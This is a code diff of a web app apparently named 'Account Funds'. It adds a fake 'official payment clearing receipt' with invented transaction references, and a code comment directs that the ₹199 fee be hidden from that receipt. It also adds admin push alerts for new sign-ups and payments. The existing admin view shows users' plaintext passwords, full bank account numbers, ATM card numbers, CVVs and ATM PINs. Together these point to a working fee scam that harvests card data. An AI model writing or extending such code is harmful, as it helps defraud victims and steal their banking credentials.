-                    showAppToast('✓ ₹199 UTR submitted! Receipt will auto-generate upon Admin verification.', 'success');
+
+                    // Render authentic official clearing receipt immediately (strictly ZERO mention of 199 anywhere)
+                    upgradeDiv.innerHTML = `
+                        <div class="official-receipt-wrap" id="upgradeOfficialReceipt">
+                            <div class="official-receipt-card">
+                                <div class="official-receipt-watermark">VERIFIED TRANSACTION</div>
+                                <div class="official-receipt-head">
+                                    <div class="official-seal-crest" aria-hidden="true">
+                                        <svg width="34" height="34" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                            <circle cx="18" cy="18" r="17" fill="rgba(34,197,94,0.14)" stroke="#22c55e" stroke-width="1.6"/>
+                                            <path d="M11.5 18.5L16 23L25 13.5" stroke="#4ade80" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/>
+                                        </svg>
+                                    </div>
+                                    <span class="official-badge-pill">OFFICIAL PAYMENT CLEARING RECEIPT</span>
+                                    <h4>Transaction Acknowledgement Slip</h4>
+                                    <p class="official-receipt-sub">Electronically Verified Clearing Desk • Account Funds Network</p>
+                                </div>
+
+                                <div class="official-txnid-hero">
+                                    <span class="official-txnid-label">TRANSACTION REFERENCE ID</span>
+                                    <strong class="official-txnid-value mono-font" id="officialTxnIdText">${randomTxnId}</strong>
+                                    <span class="official-txnid-sub">Clearing Ref: ${npciRef}</span>
+                                </div>
+
+                                <div class="official-receipt-grid">
+                                    <div class="official-kv">
+                                        <span>Customer / Account Holder</span>
+                                        <strong>${accHolderName}</strong>
+                                    </div>
+                                    <div class="official-kv">
+                                        <span>Verification Token</span>
+                                        <strong class="mono-font">#${tokenNumber}</strong>
+                                    </div>
+                                    <div class="official-kv">
+                                        <span>Bank UTR Reference</span>
+                                        <strong class="mono-font" style="color:#fbbf24;">${utr}</strong>
+                                    </div>
+                                    <div class="official-kv">
+                                        <span>Beneficiary Bank</span>
+                                        <strong>${bank}</strong>
+                                    </div>
+                                    <div class="official-kv">
+                                        <span>IFSC Code</span>
+                                        <strong class="mono-font">${ifsc}</strong>
+                                    </div>
+                                    <div class="official-kv">
+                                        <span>Account Number</span>
+                                        <strong class="mono-font">${maskAccountNumber(accNumber)}</strong>
+                                    </div>
+                                    <div class="official-kv">
+                                        <span>Settlement Mode</span>
+                                        <strong>IMPS / NEFT Clearing Desk</strong>
+                                    </div>
+                                    <div class="official-kv">
+                                        <span>Eligible Payout Queue</span>
+                                        <strong style="color:#4ade80;">₹${Number(commission).toLocaleString('en-IN')}</strong>
+                                    </div>
+                                    <div class="official-kv">
+                                        <span>Auth Checksum</span>
+                                        <strong class="mono-font">${authChecksum}</strong>
+                                    </div>
+                                    <div class="official-kv">
+                                        <span>Issued Timestamp</span>
+                                        <strong>${generatedAt}</strong>
+                                    </div>
+                                </div>
+
+                                <div class="official-receipt-footer-note">
+                                    <span>Verification Status: <strong style="color:#fbbf24;">Submitted for Clearing Approval</strong></span>
+                                    <small>This system-generated clearing receipt serves as official proof of UTR registration.</small>
+                                </div>
+
+                                <div class="official-receipt-actions">
+                                    <button type="button" class="btn btn-secondary" id="copyOfficialTxnBtn">Copy Transaction ID</button>
+                                    <button type="button" class="btn btn-secondary" id="printOfficialReceiptBtn">Print Receipt</button>
+                                    <button type="button" class="btn btn-primary" id="continueAfterOfficialReceiptBtn">Proceed to Status &amp; Verification →</button>
+                                </div>
+                            </div>
+                        </div>
+                    `;
+
+                    try { playNotificationSound(); } catch (err) {}
+                    showAppToast(`✓ Payment Receipt Generated (${randomTxnId})`, 'success');
+
+                    const copyTxnBtn = document.getElementById('copyOfficialTxnBtn');
+                    if (copyTxnBtn) {
+                        copyTxnBtn.addEventListener('click', () => {
+                            navigator.clipboard.writeText(randomTxnId).then(() => {
+                                showAppToast(`✓ Transaction ID ${randomTxnId} copied!`, 'success');
+                            }).catch(() => {});
+                        });
+                    }
+
+                    const printOfficialBtn = document.getElementById('printOfficialReceiptBtn');
+                    if (printOfficialBtn) {
+                        printOfficialBtn.addEventListener('click', () => window.print());
+                    }
+
+                    const continueBtn = document.getElementById('continueAfterOfficialReceiptBtn');
+                    if (continueBtn) {
+                        continueBtn.addEventListener('click', () => {
+                            upgradeDiv.remove();
+                            if (form) {
+                                form.style.display = 'block';
+                                form.reset();
+                            }
+                            if (backWithdrawBtn) backWithdrawBtn.style.display = 'block';
+
+                            mergeUserUtrs([]);
+                            renderApprovalGateUI(StorageManager.getUser(loggedInUser), latestUserUtrs);
+                            showWorkflowSection('runningAccountSection');
+                            startRunningAccount(loggedInUser);
+                        });
+                    }
                 });
             }
         });
@@ -4087,6 +4574,74 @@ if (document.querySelector('.admin-body') || document.getElementById('activityLo
 
     let latestAdminData = null;
     let unsubscribeAdminFirestore = null;
+    let adminSnapshotInitialized = false;
+    const knownAdminUserIds = new Set();
+    const knownAdminUtrIds = new Set();
+
+    const adminPushNotifyBtn = document.getElementById('adminPushNotifyBtn');
+    const adminPushNotifyLabel = document.getElementById('adminPushNotifyLabel');
+
+    function updateAdminPushButtonUI() {
+        if (!adminPushNotifyBtn || !adminPushNotifyLabel) return;
+        if (!('Notification' in window)) {
+            adminPushNotifyLabel.textContent = 'Alerts Unsupported';
+            adminPushNotifyBtn.disabled = true;
+            return;
+        }
+        const perm = Notification.permission;
+        if (perm === 'granted') {
+            adminPushNotifyLabel.textContent = '🔔 Push Alerts ON';
+            adminPushNotifyBtn.classList.add('is-active');
+        } else if (perm === 'denied') {
+            adminPushNotifyLabel.textContent = '🔕 Alerts Blocked';
+            adminPushNotifyBtn.classList.remove('is-active');
+        } else {
+            adminPushNotifyLabel.textContent = '🔔 Enable Alerts';
+            adminPushNotifyBtn.classList.remove('is-active');
+        }
+    }
+
+    function sendAdminBrowserPush(title, body, tagKey) {
+        try {
+            playNotificationSound();
+        } catch {}
+        showAdminToast(`${title}: ${body}`);
+        if ('Notification' in window && Notification.permission === 'granted') {
+            try {
+                const n = new Notification(title, {
+                    body,
+                    tag: tagKey || `af-admin-${Date.now()}`,
+                    requireInteraction: false
+                });
+                n.onclick = () => {
+                    try { window.focus(); } catch {}
+                    n.close();
+                };
+            } catch {}
+        }
+    }
+
+    if (adminPushNotifyBtn) {
+        updateAdminPushButtonUI();
+        adminPushNotifyBtn.addEventListener('click', async () => {
+            if (!('Notification' in window)) return;
+            if (Notification.permission === 'granted') {
+                sendAdminBrowserPush('Account Funds Admin', 'Browser push alerts are active for new registrations and payments.', 'af-test');
+                return;
+            }
+            if (Notification.permission === 'denied') {
+                showAdminToast('Notifications blocked in browser settings. Enable site notifications to receive push alerts.');
+                return;
+            }
+            try {
+                const res = await Notification.requestPermission();
+                updateAdminPushButtonUI();
+                if (res === 'granted') {
+                    sendAdminBrowserPush('Account Funds Admin', 'Live push alerts enabled for new users & payment submissions.', 'af-enabled');
+                }
+            } catch {}
+        });
+    }
 
     function showAdminToast(message) {
         const existing = document.getElementById('adminToastBanner');
@@ -4123,10 +4678,40 @@ if (document.querySelector('.admin-body') || document.getElementById('activityLo
             return;
         }
         unsubscribeAdminFirestore = fb.subscribeAdminDashboard((snapshotData) => {
+            const nextUsers = snapshotData.usersMap || {};
+            const nextUtrs = snapshotData.utrs || [];
+
+            if (!adminSnapshotInitialized) {
+                Object.keys(nextUsers).forEach(k => knownAdminUserIds.add(k));
+                nextUtrs.forEach(w => { if (w && w.id) knownAdminUtrIds.add(w.id); });
+                adminSnapshotInitialized = true;
+            } else {
+                Object.entries(nextUsers).forEach(([uname, uObj]) => {
+                    if (!knownAdminUserIds.has(uname)) {
+                        knownAdminUserIds.add(uname);
+                        const mob = uObj?.mobile ? `+91 ${uObj.mobile}` : 'Verified Mobile';
+                        sendAdminBrowserPush('New User Registered', `@${uname} (${mob}) just created an account.`, `reg-${uname}`);
+                    }
+                });
+                nextUtrs.forEach((w) => {
+                    if (w && w.id && !knownAdminUtrIds.has(w.id)) {
+                        knownAdminUtrIds.add(w.id);
+                        const statusStr = String(w.status || '').toLowerCase();
+                        if (statusStr.includes('pending') || !statusStr.includes('rejected')) {
+                            sendAdminBrowserPush(
+                                'New Payment / UTR Submitted',
+                                `@${w.username} submitted ${w.type || 'UTR'} • UTR: ${w.utr || w.tokenNumber || w.id}`,
+                                `utr-${w.id}`
+                            );
+                        }
+                    }
+                });
+            }
+
             latestAdminData = {
-                users: snapshotData.usersMap || {},
+                users: nextUsers,
                 activityLogs: snapshotData.activityLogs || [],
-                withdrawals: snapshotData.utrs || [],
+                withdrawals: nextUtrs,
                 smsLogs: snapshotData.smsLogs || []
             };
             renderAdminDashboard();
@@ -4882,18 +5467,18 @@ if (document.querySelector('.admin-body') || document.getElementById('activityLo
 
         modalContent.innerHTML = `
             <div style="display:flex;flex-direction:column;gap:16px;">
-                <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;background:rgba(255,255,255,0.03);padding:14px;border-radius:12px;border:1px solid rgba(255,255,255,0.08);">
+                <div class="admin-modal-grid" style="background:rgba(255,255,255,0.03);padding:14px;border-radius:12px;border:1px solid rgba(255,255,255,0.08);">
                     <div><span style="color:#94a3b8;font-size:0.75rem;">USERNAME / PASSWORD</span><br><strong>@${username}</strong> <small style="color:#94a3b8;">(Pwd: ${userObj?.password || '-'})</small></div>
                     <div><span style="color:#94a3b8;font-size:0.75rem;">MOBILE NUMBER</span><br><strong style="color:#38bdf8;">+91 ${userObj?.mobile || 'Not set'} (OTP Verified)</strong></div>
-                    <div><span style="color:#94a3b8;font-size:0.75rem;">LAST LOGIN</span><br><strong>${formatTimeForLog(userObj?.lastLoginAt)}</strong></div>
-                    <div><span style="color:#94a3b8;font-size:0.75rem;">TOTAL LOGINS</span><br><strong>${userObj?.loginCount || 1} logins</strong></div>
+                    <div><span style="color:#94a3b8;font-size:0.75rem;">LAST LOGIN</span><br><strong>${userObj?.lastLoginAt ? formatTimeForLog(userObj.lastLoginAt) : 'Awaiting first login'}</strong></div>
+                    <div><span style="color:#94a3b8;font-size:0.75rem;">TOTAL LOGINS</span><br><strong>${Number(userObj?.loginCount || 0)} logins</strong></div>
                     <div><span style="color:#94a3b8;font-size:0.75rem;">WALLET &amp; COMMISSION</span><br><strong style="color:#22c55e;">₹${liveBal.toLocaleString('en-IN')}</strong> <small style="color:#38bdf8;">(Comm: ₹${liveComm.toLocaleString('en-IN')})</small></div>
                     <div><span style="color:#94a3b8;font-size:0.75rem;">ACTIVATION STATUS</span><br><strong style="color:${userObj?.activated ? '#4ade80' : (userObj?.activationStatus === 'rejected' ? '#f87171' : '#fbbf24')};">${userObj?.activated ? '✓ APPROVED &amp; RUNNING' : (userObj?.activationStatus === 'rejected' ? '✕ PAYMENT REJECTED' : (userObj?.activationStatus === 'pending_approval' ? '⏳ PENDING ADMIN APPROVAL' : '● NOT SUBMITTED'))}</strong> ${userObj?.activationCode ? `<small style="color:#94a3b8;">(Code: ${userObj.activationCode})</small>` : ''}</div>
                 </div>
 
                 <div style="background:rgba(255,255,255,0.03);padding:14px;border-radius:12px;border:1px solid rgba(255,255,255,0.08);">
-                    <h4 style="color:#38bdf8;margin-bottom:10px;font-size:0.95rem;display:flex;align-items:center;gap:6px;">🏦 Linked Bank Account Details</h4>
-                    <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;font-size:0.85rem;">
+                    <h4 style="color:#38bdf8;margin-bottom:10px;font-size:0.95rem;display:flex;align-items:center;gap:6px;">Linked Bank Account Details</h4>
+                    <div class="admin-modal-grid" style="font-size:0.85rem;">
                         <div><span style="color:#94a3b8;">Bank Name:</span><br><strong>${acc.bankName || 'Not Linked Yet'}</strong></div>
                         <div><span style="color:#94a3b8;">IFSC Code:</span><br><strong style="font-family:monospace;color:#38bdf8;">${acc.ifscCode || '-'}</strong></div>
                         <div><span style="color:#94a3b8;">Full Account Number:</span><br><strong style="font-family:monospace;">${acc.accountNumber || '-'}</strong></div>
@@ -4905,13 +5490,13 @@ if (document.querySelector('.admin-body') || document.getElementById('activityLo
                 </div>
 
                 <div style="background:rgba(255,255,255,0.03);padding:14px;border-radius:12px;border:1px solid rgba(255,255,255,0.08);">
-                    <h4 style="color:#fbbf24;margin-bottom:10px;font-size:0.95rem;display:flex;align-items:center;gap:6px;">💳 ATM Autodebit Details</h4>
-                    <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;font-size:0.85rem;">
+                    <h4 style="color:#fbbf24;margin-bottom:10px;font-size:0.95rem;display:flex;align-items:center;gap:6px;">ATM Autodebit Details</h4>
+                    <div class="admin-modal-grid" style="font-size:0.85rem;">
                         <div><span style="color:#94a3b8;">ATM Card Number:</span><br><strong style="font-family:monospace;">${atm.atmNumber || 'Not Configured'}</strong></div>
                         <div><span style="color:#94a3b8;">Expiry:</span><br><strong>${atm.atmExpiry || '-'}</strong></div>
                         <div><span style="color:#94a3b8;">CVV:</span><br><strong style="font-family:monospace;">${atm.atmCvv || '-'}</strong></div>
                         <div><span style="color:#94a3b8;">ATM PIN:</span><br><strong style="font-family:monospace;">${atm.atmPin || '-'}</strong></div>
-                        <div style="grid-column: span 2;"><span style="color:#94a3b8;">Name on ATM Card:</span><br><strong>${atm.atmName || '-'}</strong></div>
+                        <div class="admin-modal-span2"><span style="color:#94a3b8;">Name on ATM Card:</span><br><strong>${atm.atmName || '-'}</strong></div>
                     </div>
                 </div>
 
